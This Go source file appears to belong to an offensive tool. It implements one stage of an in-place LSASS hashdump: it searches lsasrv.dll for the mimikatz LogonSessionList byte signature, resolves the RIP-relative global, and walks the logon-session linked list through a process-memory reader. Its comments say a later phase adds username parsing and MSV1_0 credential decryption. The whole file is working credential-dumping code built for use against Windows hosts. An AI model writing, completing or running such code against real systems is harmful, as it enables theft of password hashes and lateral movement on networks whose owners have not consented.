package commands

// LSASS LogonSessionList walker — Phase 2B foundation for hashdump in-situ.
//
// This file owns the cross-platform pieces of Phase 2B so they can be unit
// tested on Linux without a Windows host. It defines:
//
//  1. lsassReader: a small interface that abstracts ReadProcessMemory. The
//     concrete Windows implementation (lsassRemoteReader) lives in
//     lsass_remote_windows.go; tests use bufferReader (lsass_logonlist_test.go).
//  2. findLogonSessionListAnchor: scans a captured lsasrv.dll image for the
//     mimikatz LogonSessionList signature, decodes the RIP-relative MOV that
//     loads the global, and returns the LSASS-virtual address of the
//     LogonSessionList head sentinel.
//  3. walkLogonSessionList: follows Flink pointers from the head sentinel
//     until either the cursor wraps back to the anchor (clean termination)
//     or a safety cap fires.
//
// Phase 2C will extend this with username/domain/AuthPkg field parsing and
// MSV1_0 credential decryption.

import (
	"encoding/binary"
	"fmt"
)

// LogonSessionListSignature is the mimikatz signature_x64_w8 byte pattern
// that brackets the MOV r8, [LogonSessionList] instruction. Calibrated for
// Win10 21H2 — Win11 23H2 (current as of mimikatz 2024-Q4 commits).
//
// Decoding the matched 23-byte region (offsets within the match):
//
//	+0   33 F6              XOR ESI, ESI
//	+2   89 77 00           MOV [RDI+0], ESI
//	+5   4C 8D 4D D0        LEA R9, [RBP-30h]
//	+9   4C 8B 05 ?? ?? ?? ?? MOV R8, [RIP+disp32]   ← LogonSessionList load
//	+16  48 8D 1D ?? ?? ?? ?? LEA RBX, [RIP+disp32]
//
// The MOV at offset 9 has a 4-byte displacement at offset +3 within the
// instruction (after 4C 8B 05) and total length 7. resolveRIPRelative on
// (haystack, hit+9, 3, 7) yields the in-buffer offset of the LogonSessionList
// global; adding the lsasrv.dll base converts that to a process-absolute
// address.
const (
	LogonSessionListSignature        = "33 F6 89 77 00 4C 8D 4D D0 4C 8B 05 ?? ?? ?? ?? 48 8D 1D ?? ?? ?? ??"
	logonSessionListMovInstrOffset   = 9 // MOV r8,[mem] starts at +9 within the matched region
	logonSessionListMovInstrLen      = 7
	logonSessionListMovDispFieldOffs = 3 // 4-byte disp32 starts 3 bytes into the MOV
)

// lsassReader abstracts ReadProcessMemory so the Phase 2B walker is testable
// without a Windows host. Concrete implementations are expected to:
//
//   - return exactly `size` bytes on success (short reads are errors),
//   - never return a buffer aliased with internal state (callers retain it),
//   - be safe to call repeatedly with arbitrary addresses within the target
//     process; pages outside committed regions should return an error rather
//     than silently zero-filling.
type lsassReader interface {
	Read(addr uintptr, size uint32) ([]byte, error)
}

// listEntry is the doubly-linked list head/node prefix shared by every node
// in LogonSessionList. On x64 both pointers are 8 bytes; total size 16 bytes.
type listEntry struct {
	Flink uintptr
	Blink uintptr
}

// logonListNode captures the metadata Phase 2B emits for each walked node.
// Address is the LSASS-virtual address of the node; Flink/Blink are decoded
// from the first 16 bytes of Raw. Phase 2C will overlay struct parsing onto
// Raw to extract username, domain, AuthPkg, and credential blobs.
type logonListNode struct {
	Address uintptr
	Flink   uintptr
	Blink   uintptr
	Raw     []byte
}

// findLogonSessionListAnchor scans `lsasrvBytes` for the mimikatz
// LogonSessionList signature and returns the LSASS-virtual address of the
// LogonSessionList head sentinel. `lsasrvBase` is the base address at which
// lsasrvBytes is mapped in LSASS, so the in-buffer offset can be converted
// to a process-absolute address.
//
// Returns an error if the signature is missing (likely a Windows build the
// signature isn't calibrated for) or if the resolved RIP-relative target
// lies outside the captured buffer (unlikely for lsasrv.dll, but a
// distinguishing case is more useful than a generic failure).
func findLogonSessionListAnchor(lsasrvBytes []byte, lsasrvBase uintptr) (uintptr, error) {
	pat, mask, err := parseHexPattern(LogonSessionListSignature)
	if err != nil {
		return 0, fmt.Errorf("internal: bad LogonSessionList signature: %w", err)
	}
	hit := findPattern(lsasrvBytes, pat, mask)
	if hit < 0 {
		return 0, fmt.Errorf("LogonSessionList signature not found in lsasrv.dll (%d bytes scanned) — Windows build may need a different signature variant", len(lsasrvBytes))
	}
	target, _, ok := resolveRIPRelative(
		lsasrvBytes,
		hit+logonSessionListMovInstrOffset,
		logonSessionListMovDispFieldOffs,
		logonSessionListMovInstrLen,
	)
	if !ok {
		return 0, fmt.Errorf("LogonSessionList RIP-relative target outside captured lsasrv.dll buffer (matched at offset %d, computed target offset %d, buffer size %d)", hit, target, len(lsasrvBytes))
	}
	return lsasrvBase + uintptr(target), nil
}

// walkLogonSessionList follows Flink pointers from the LogonSessionList head
// sentinel. The walk terminates when:
//
//   - the cursor returns to anchorAddr (clean: list fully traversed), or
//   - maxNodes iterations elapse (defensive cap to bound runaway walks), or
//   - a node read fails or returns an obviously bad pointer (null Flink, or
//     a self-referential node), at which point the partial list is returned
//     alongside the error so callers can still report what was collected.
//
// nodeReadSize controls how many bytes are pulled per node. Phase 2B uses
// 0x100 (256) because that captures both the LIST_ENTRY prefix and enough
// scaffolding for cross-reference scans without depending on field offsets
// that drift across Windows builds.
func walkLogonSessionList(r lsassReader, anchorAddr uintptr, nodeReadSize uint32, maxNodes int) ([]logonListNode, error) {
	if r == nil {
		return nil, fmt.Errorf("nil lsassReader")
	}
	if anchorAddr == 0 {
		return nil, fmt.Errorf("zero anchor address")
	}
	if nodeReadSize < 16 {
		return nil, fmt.Errorf("nodeReadSize %d too small (need >=16 for LIST_ENTRY)", nodeReadSize)
	}
	if maxNodes <= 0 {
		maxNodes = 4096
	}

	head, err := readListEntry(r, anchorAddr)
	if err != nil {
		return nil, fmt.Errorf("read LogonSessionList head at 0x%X: %w", anchorAddr, err)
	}
	if head.Flink == 0 || head.Flink == anchorAddr {
		return nil, fmt.Errorf("LogonSessionList head is empty (anchor=0x%X, head.Flink=0x%X)", anchorAddr, head.Flink)
	}

	nodes := make([]logonListNode, 0, 8)
	cursor := head.Flink
	visited := make(map[uintptr]bool, 8)
	for i := 0; i < maxNodes; i++ {
		if cursor == anchorAddr {
			return nodes, nil // walked back to head: clean termination
		}
		if cursor == 0 {
			return nodes, fmt.Errorf("null Flink encountered at node index %d (after %d successful reads)", i, len(nodes))
		}
		if visited[cursor] {
			return nodes, fmt.Errorf("cycle detected at node index %d (cursor=0x%X already visited)", i, cursor)
		}
		visited[cursor] = true

		buf, err := r.Read(cursor, nodeReadSize)
		if err != nil {
			return nodes, fmt.Errorf("read node %d at 0x%X: %w", i, cursor, err)
		}
		if len(buf) < 16 {
			return nodes, fmt.Errorf("short read at node %d (0x%X): got %d bytes, need >=16", i, cursor, len(buf))
		}
		flink := uintptr(binary.LittleEndian.Uint64(buf[0:8]))
		blink := uintptr(binary.LittleEndian.Uint64(buf[8:16]))
		nodes = append(nodes, logonListNode{
			Address: cursor,
			Flink:   flink,
			Blink:   blink,
			Raw:     buf,
		})
		cursor = flink
	}
	return nodes, fmt.Errorf("walk hit safety cap of %d nodes without returning to anchor (last cursor=0x%X)", maxNodes, cursor)
}

func readListEntry(r lsassReader, addr uintptr) (listEntry, error) {
	buf, err := r.Read(addr, 16)
	if err != nil {
		return listEntry{}, err
	}
	if len(buf) < 16 {
		return listEntry{}, fmt.Errorf("short read: got %d bytes, want 16", len(buf))
	}
	return listEntry{
		Flink: uintptr(binary.LittleEndian.Uint64(buf[0:8])),
		Blink: uintptr(binary.LittleEndian.Uint64(buf[8:16])),
	}, nil
}

// scanRawForLUID returns true if the given 8-byte LUID value appears anywhere
// in the node's raw bytes. Phase 2B uses this to cross-reference walked nodes
// against the Phase 1 LSA-API session list — a positive match validates that
// the walk landed on real LSAP_LOGON_SESSION_LIST nodes without depending on
// build-specific field offsets. Phase 2C will replace this with structured
// LUID extraction once offsets are calibrated.
func scanRawForLUID(raw []byte, luid uint64) bool {
	if len(raw) < 8 {
		return false
	}
	var needle [8]byte
	binary.LittleEndian.PutUint64(needle[:], luid)
	last := len(raw) - 8
	for i := 0; i <= last; i++ {
		if raw[i] == needle[0] && raw[i+1] == needle[1] && raw[i+2] == needle[2] && raw[i+3] == needle[3] &&
			raw[i+4] == needle[4] && raw[i+5] == needle[5] && raw[i+6] == needle[6] && raw[i+7] == needle[7] {
			return true
		}
	}
	return false
}
